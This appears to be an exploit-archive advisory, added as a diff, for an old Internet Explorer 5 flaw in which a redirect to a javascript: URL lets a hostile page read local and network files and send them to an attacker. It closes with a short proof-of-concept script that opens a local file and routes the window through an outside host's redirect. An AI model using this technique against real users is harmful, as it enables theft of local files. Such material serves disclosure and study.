@@ -1,0 +1,26 @@
+Microsoft Internet Explorer 5.0 for Windows 2000/Windows 95/Windows 98/Windows NT 4,Microsoft Internet Explorer 4.0.1 for Windows 98/Windows NT 4.0/Unix 5.0 Javascript URL Redirection Vulnerability
+
+source: http://www.securityfocus.com/bid/722/info
+
+A malicious web site operator could design a web page that, when visited by an IE5 user, would read a local file from the victim host (or any file on the victim's network to which the victim has access) and send the contents of that file to a designated remote location.
+
+1) The IE5 user visits a malicious web site.
+
+2) The web site instructs the client to open another IE5 browser window and display the contents of a file residing on the IE5 user's host (or another host on the network to which the IE5 user has access).
+
+3) Immediately after opening the new browser window, the window is instructed to browse to a specified web site ie: http://malicious server.com/hack.cgi?doit.
+
+4) The hack.cgi?doit page does not return a web page, but instead redirects the window to a javascript URL containing embedded executable code.
+
+5) The javascript code (from step 4) can now access any files on the victim's host (or any file on the victim's network to which the victim has access) and send it to a location maintained by the malicious web site operator.
+
+Under normal circumstances, javascript received from a non-local "security zone" is not allowed to perform such actions against files on the local host. In this instance, however, the IE5 browser has been fooled (via http redirect to javascript) into thinking that the Javascript should execute under the security context of the local host's security zone as the javascript was requested from a browser displaying the local file.
+
+Microsoft has released a FAQ that contains a good description of this vulnerability: http://www.microsoft.com/security/bulletins/MS99-043faq.asp. 
+
+<SCRIPT>
+alert("Create a short text file C:\\TEST.TXT and it will be read and shown in a dialog box");
+a=window.open("file://c:/test.txt");
+a.location="http://www.nat.bg/~joro/reject.cgi?jsredir1";
+</SCRIPT>
+// "http://www.nat.bg/~joro/reject.cgi?jsredir1" just does a HTTP redirect to: "javascript:alert(document.body.innerText)"
